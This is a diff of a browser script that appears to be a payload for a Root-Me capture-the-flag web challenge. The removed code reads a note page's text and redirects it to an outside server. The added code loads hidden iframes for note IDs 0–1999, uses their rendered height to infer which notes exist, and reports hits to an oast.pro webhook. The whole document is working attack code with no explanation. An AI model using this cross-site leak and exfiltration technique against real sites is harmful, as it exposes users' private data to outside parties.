@@ -1,22 +1,32 @@
 <script>
-(function () {
-    const TARGET = "https://web-client-ch56.challenge01.root-me.org:58056";
-    const SERVER = "https://your-app.up.railway.app";
+const TARGET = "https://web-client-ch56.challenge01.root-me.org:58056/notes/";
+const WEBHOOK = "https://525146614d396f3af709gux4rbeyyyyyb.oast.pro";
 
-    const parts = location.pathname.split("/");
-    const id = parseInt(parts[parts.length - 1]);
+function testRange(a = 0, b = 2000) {
+    for (let i = a; i < b; i++) {
+        const iframe = document.createElement("iframe");
 
-    if (isNaN(id)) {
-        window.location.replace("https://web-client-ch56.challenge01.root-me.org:58056/notes/0");
-        return;
+        iframe.src = TARGET + i;
+        iframe.style.position = "absolute";
+        iframe.style.left = "-9999px";
+        iframe.style.width = "1000px";
+        iframe.style.height = "1000px";
+
+        iframe.onload = () => {
+            const h = iframe.offsetHeight;
+
+            if (h > 300) {
+                console.log("LIKELY VALID:", i);
+
+                new Image().src = WEBHOOK + "?id=" + i;
+            }
+
+            iframe.remove();
+        };
+
+        document.body.appendChild(iframe);
     }
+}
 
-    const data = encodeURIComponent(document.body.innerText);
-
-    location.href =
-        SERVER +
-        "?id=" + id +
-        "&d=" + data +
-        "&next=" + (id + 1);
-})();
+testRange();
 </script>
